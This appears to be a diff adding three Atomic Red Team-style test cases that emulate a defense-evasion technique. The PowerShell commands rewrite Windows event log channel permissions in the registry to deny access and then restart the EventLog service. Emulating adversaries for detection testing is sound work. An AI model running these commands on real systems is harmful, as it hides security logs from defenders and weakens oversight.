@@ -145,3 +145,63 @@ atomic_tests:
     cleanup_command: |
       echo "Sorry you have to reboot"
     name: command_prompt
+- name: Modify Event Log Channel Access Permissions via Registry - PowerShell
+  auto_generated_guid: 8e81d090-0cd6-4d46-863c-eec11311298f
+  description: |-
+    This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the "ChannelAccess" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
+    Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".
+  supported_platforms:
+    - windows
+  input_arguments:
+    ChannelPath:
+      type: string
+      default: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational
+      description: Path to the event log service channel to alter
+  executor:
+    command: |-
+      Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
+      Restart-Service -Name EventLog -Force -ErrorAction Ignore 
+    cleanup_command: |-
+      Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)"
+      Restart-Service -Name EventLog -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Modify Event Log Channel Access Permissions via Registry 2 - PowerShell
+  auto_generated_guid: 85e6eff8-3ed4-4e03-ae50-aa6a404898a5
+  description: |-
+    This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the "ChannelAccess" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
+    Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".
+  supported_platforms:
+    - windows
+  input_arguments:
+    ChannelPath:
+      type: string
+      default: HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup
+      description: Path to the event log service channel to alter
+  executor:
+    command: |-
+      New-Item -Path #{ChannelPath} -Force
+      Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
+      Restart-Service -Name EventLog -Force -ErrorAction Ignore
+    cleanup_command: |-
+      Remove-Item -Path #{ChannelPath} -Force
+      Restart-Service -Name EventLog -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Modify Event Log Access Permissions via Registry - PowerShell
+  auto_generated_guid: a0cb81f8-44d0-4ac4-a8f3-c5c7f43a12c1
+  description: |-
+    This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the "CustomSD" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
+    Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".
+  supported_platforms:
+    - windows
+  input_arguments:
+    CustomSDPath:
+      type: string
+      default: HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System
+      description: Path to the event log service channel to alter
+  executor:
+    command: 'Set-ItemProperty -Path #{CustomSDPath} -Name "CustomSD" -Value "O:SYG:SYD:(D;;0x1;;;WD)"'
+    cleanup_command: 'Remove-ItemProperty -Path #{CustomSDPath} -Name "CustomSD"'
+    name: powershell
+    elevation_required: true
